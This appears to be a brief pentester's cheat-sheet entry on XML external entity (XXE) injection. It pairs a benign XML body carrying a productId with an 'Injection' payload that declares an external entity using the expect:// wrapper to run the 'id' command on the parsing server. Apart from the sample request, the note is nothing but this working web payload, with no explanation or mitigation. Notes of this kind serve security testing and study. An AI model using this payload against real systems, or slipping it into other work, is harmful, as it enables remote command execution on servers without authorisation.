#xmli #xxe #xml 

## Code
```xml
<?xml version="1.0" encoding="UTF-8"?>
<productId>1</productId>
```

## Injection
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY myVar SYSTEM 'expect://id'>]>
<root>&myVar;</root>
```